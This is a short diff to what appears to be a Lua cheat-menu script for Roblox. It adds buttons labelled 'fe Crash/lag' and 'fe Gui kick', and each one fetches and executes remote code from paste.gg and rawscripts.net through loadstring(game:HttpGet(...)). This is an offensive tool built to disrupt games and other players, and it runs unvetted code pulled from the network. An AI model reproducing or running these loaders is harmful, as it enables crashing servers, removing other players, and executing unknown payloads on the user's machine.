@@ -150,6 +150,16 @@ print("Hello World!")
 end})
 
 Tab1:AddButton({"fe Crash/lag", function(Value)
+loadstring(game:HttpGet("https://paste.gg/p/anonymous/d3492bd620bd4c46b54680ac80b0fa0d/files/161ddd9c992c4ceba3c298458d45188a/raw", true))()
+print("Hello World!")
+end})
+
+Tab1:AddButton({"fe Gui kick", function(Value)
+loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Kick-gui-by-me-10648", true))()
+print("Hello World!")
+end})
+
+Tab1:AddButton({"Print", function(Value)
 
 print("Hello World!")
 end})
